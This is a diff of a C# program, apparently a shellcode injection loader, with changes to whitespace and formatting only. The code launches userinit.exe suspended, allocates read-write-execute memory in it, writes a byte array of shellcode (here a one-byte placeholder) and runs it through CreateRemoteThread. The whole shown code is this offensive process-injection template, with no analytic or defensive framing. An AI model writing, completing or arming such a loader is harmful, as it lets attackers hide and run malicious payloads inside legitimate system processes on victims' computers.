@@ -60,7 +60,7 @@ public class Program
         CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
     }
 
-	
+
     [StructLayout(LayoutKind.Sequential)]
     public class StartupInfo
     {
@@ -98,12 +98,12 @@ public class Program
 
     [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-    
-	[DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
-	
+
     [DllImport("kernel32.dll")]
-    static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
 
     private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
@@ -111,22 +111,22 @@ public class Program
 
     public static void Main()
     {
-		string binary = "userinit.exe";
+        string binary = "userinit.exe";
 
-        byte[] sc = new byte[1] {0xfc};
+        byte[] sc = new byte[1] { 0xfc };
 
         Int32 size = sc.Length;
         StartupInfo sInfo = new StartupInfo();
         sInfo.dwFlags = 0;
         ProcessInformation pInfo;
-        string binaryPath = "C:\\Windows\\System32\\"+binary;    
+        string binaryPath = "C:\\Windows\\System32\\" + binary;
         IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
         IntPtr hProcess = pInfo.hProcess;
         IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	
+
         int test = 0;
         IntPtr size2 = new IntPtr(sc.Length);
         bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
         CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
-     }
+    }
 }
